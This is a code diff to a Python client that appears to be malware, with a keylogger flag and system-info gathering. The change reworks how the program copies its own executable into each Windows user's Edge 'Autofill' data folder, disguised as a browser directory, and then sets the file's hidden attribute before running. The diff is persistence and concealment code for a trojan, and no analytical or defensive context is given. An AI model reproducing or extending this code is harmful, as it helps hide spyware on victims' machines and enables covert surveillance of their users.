@@ -27,7 +27,6 @@ class Client:
         self.BuffSize = 100000000
         self.key_pressed = None
         self.status_keylogger = False
-        self.new_path = 'C:\\Users\\BCC\\AppData\\Local\\Microsoft\\Edge\\User Data\\Autofill'
     async def UpdateInfoAndSend(self):
         self.OS_VER  = platform.platform()
         self.OS_NAME = platform.system()
@@ -59,15 +58,24 @@ class Client:
         name, ext = os.path.splitext(file_name)
         current_file_path = self.PWD + '\\' + name + '.exe'
 
-        try:
-            shutil.copy(current_file_path, self.new_path)
-            file_name = os.path.basename(__file__)
-            name, ext = os.path.splitext(file_name)
-            attr = win32api.GetFileAttributes(self.new_path + '\\' + name + '.exe')
-            win32api.SetFileAttributes(self.new_path + '\\' + name + '.exe', attr | win32con.FILE_ATTRIBUTE_HIDDEN)
-            self.COPY = True
-        except:
-            pass
+        users = psutil.users()
+
+        if self.COPY == False:
+            for user in users:
+                self.new_path = f'C:\\Users\\{user.name}\\AppData\\Local\\Microsoft\\Edge\\User Data\\Autofill'
+                try:
+                    shutil.copy(current_file_path, self.new_path)
+                    self.COPY = True
+                except:
+                    continue
+                break
+            try:
+                file_name = os.path.basename(__file__)
+                name, ext = os.path.splitext(file_name)
+                attr = win32api.GetFileAttributes(self.new_path + '\\' + name + '.exe')
+                win32api.SetFileAttributes(self.new_path + '\\' + name + '.exe', attr | win32con.FILE_ATTRIBUTE_HIDDEN)
+            except:
+                pass
         #run .exe
         asyncio.run(self.main())
     
